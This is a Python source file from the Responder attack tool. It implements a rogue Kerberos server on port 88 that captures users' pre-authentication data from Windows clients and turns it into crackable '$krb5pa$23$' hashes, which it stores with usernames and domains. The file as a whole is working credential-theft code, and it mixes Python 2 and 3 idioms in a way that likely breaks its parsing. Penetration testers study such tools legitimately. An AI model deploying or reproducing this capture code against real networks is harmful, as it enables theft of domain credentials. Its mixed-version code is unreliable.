#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import os
import struct
import core.responder.settings as settings
import threading
from traceback import print_exc

from socketserver import BaseRequestHandler, ThreadingMixIn, TCPServer, UDPServer
from core.responder.utils import *

class Kerberos:

    def start(self):
        try:
            if OsInterfaceIsSupported():
                server1 = ThreadingTCPServer((settings.Config.Bind_To, 88), KerbTCP)
                server2 = ThreadingUDPServer((settings.Config.Bind_To, 88), KerbUDP)
            else:
                server1 = ThreadingTCPServer(('', 88), KerbTCP)
                server2 = ThreadingUDPServer(('', 88), KerbUDP)

            for server in [server1, server2]:
                t = threading.Thread(name='Kerberos', target=server.serve_forever)
                t.setDaemon(True)
                t.start()
        except Exception as e:
            print("Error starting Kerberos server: {}".format(e))
            print_exc()

class ThreadingTCPServer(ThreadingMixIn, TCPServer):
    
    allow_reuse_address = 1

    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        TCPServer.server_bind(self)

class ThreadingUDPServer(ThreadingMixIn, UDPServer):

    allow_reuse_address = 1
    
    def server_bind(self):
        if OsInterfaceIsSupported():
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, 25, settings.Config.Bind_To+'\0')
            except:
                pass
        UDPServer.server_bind(self)

def ParseMSKerbv5TCP(Data):
    MsgType     = Data[21:22]
    EncType     = Data[43:44]
    MessageType = Data[32:33]

    if MsgType == "\x0a" and EncType == "\x17" and MessageType =="\x02":
        if Data[49:53] == "\xa2\x36\x04\x34" or Data[49:53] == "\xa2\x35\x04\x33":
            HashLen = struct.unpack('<b',Data[50:51])[0]
            if HashLen == 54:
                Hash       = Data[53:105]
                SwitchHash = Hash[16:]+Hash[0:16]
                NameLen    = struct.unpack('<b',Data[153:154])[0]
                Name       = Data[154:154+NameLen]
                DomainLen  = struct.unpack('<b',Data[154+NameLen+3:154+NameLen+4])[0]
                Domain     = Data[154+NameLen+4:154+NameLen+4+DomainLen]
                BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
                return BuildHash

        if Data[44:48] == "\xa2\x36\x04\x34" or Data[44:48] == "\xa2\x35\x04\x33":
            HashLen = struct.unpack('<b',Data[45:46])[0]
            if HashLen == 53:
                Hash       = Data[48:99]
                SwitchHash = Hash[16:]+Hash[0:16]
                NameLen    = struct.unpack('<b',Data[147:148])[0]
                Name       = Data[148:148+NameLen]
                DomainLen  = struct.unpack('<b',Data[148+NameLen+3:148+NameLen+4])[0]
                Domain     = Data[148+NameLen+4:148+NameLen+4+DomainLen]
                BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
                return BuildHash

            if HashLen == 54:
                Hash       = Data[53:105]
                SwitchHash = Hash[16:]+Hash[0:16]
                NameLen    = struct.unpack('<b',Data[148:149])[0]
                Name       = Data[149:149+NameLen]
                DomainLen  = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
                Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
                BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
                return BuildHash

        else:
            Hash       = Data[48:100]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen    = struct.unpack('<b',Data[148:149])[0]
            Name       = Data[149:149+NameLen]
            DomainLen  = struct.unpack('<b',Data[149+NameLen+3:149+NameLen+4])[0]
            Domain     = Data[149+NameLen+4:149+NameLen+4+DomainLen]
            BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash
    else:
        return False

def ParseMSKerbv5UDP(Data):
    MsgType = Data[17:18]
    EncType = Data[39:40]

    if MsgType == "\x0a" and EncType == "\x17":
        if Data[40:44] == "\xa2\x36\x04\x34" or Data[40:44] == "\xa2\x35\x04\x33":
            HashLen = struct.unpack('<b',Data[41:42])[0]

            if HashLen == 54:
                Hash       = Data[44:96]
                SwitchHash = Hash[16:]+Hash[0:16]
                NameLen    = struct.unpack('<b',Data[144:145])[0]
                Name       = Data[145:145+NameLen]
                DomainLen  = struct.unpack('<b',Data[145+NameLen+3:145+NameLen+4])[0]
                Domain     = Data[145+NameLen+4:145+NameLen+4+DomainLen]
                BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
                return BuildHash

            if HashLen == 53:
                Hash       = Data[44:95]
                SwitchHash = Hash[16:]+Hash[0:16]
                NameLen    = struct.unpack('<b',Data[143:144])[0]
                Name       = Data[144:144+NameLen]
                DomainLen  = struct.unpack('<b',Data[144+NameLen+3:144+NameLen+4])[0]
                Domain     = Data[144+NameLen+4:144+NameLen+4+DomainLen]
                BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
                return BuildHash


        else:
            Hash       = Data[49:101]
            SwitchHash = Hash[16:]+Hash[0:16]
            NameLen    = struct.unpack('<b',Data[149:150])[0]
            Name       = Data[150:150+NameLen]
            DomainLen  = struct.unpack('<b',Data[150+NameLen+3:150+NameLen+4])[0]
            Domain     = Data[150+NameLen+4:150+NameLen+4+DomainLen]
            BuildHash  = "$krb5pa$23$"+Name+"$"+Domain+"$dummy$"+SwitchHash.encode('hex')
            return BuildHash
    else:
        return False

class KerbTCP(BaseRequestHandler):

    def handle(self):
        try:
            data = self.request.recv(1024)
            KerbHash = ParseMSKerbv5TCP(data)

            if KerbHash:
                (n, krb, v, name, domain, d, h) = KerbHash.split('$')

                SaveToDb({
                    'module': 'KERB',
                    'type': 'MSKerbv5',
                    'client': self.client_address[0],
                    'user': domain+'\\'+name,
                    'hash': h,
                    'fullhash': KerbHash,
                })

        except Exception:
            raise

class KerbUDP(BaseRequestHandler):

    def handle(self):
        try:
            data, soc = self.request
            KerbHash = ParseMSKerbv5UDP(data)
            
            if KerbHash:
                (n, krb, v, name, domain, d, h) = KerbHash.split('$')

                SaveToDb({
                    'module': 'KERB',
                    'type': 'MSKerbv5',
                    'client': self.client_address[0],
                    'user': domain+'\\'+name,
                    'hash': h,
                    'fullhash': KerbHash,
                })

        except Exception:
            raise
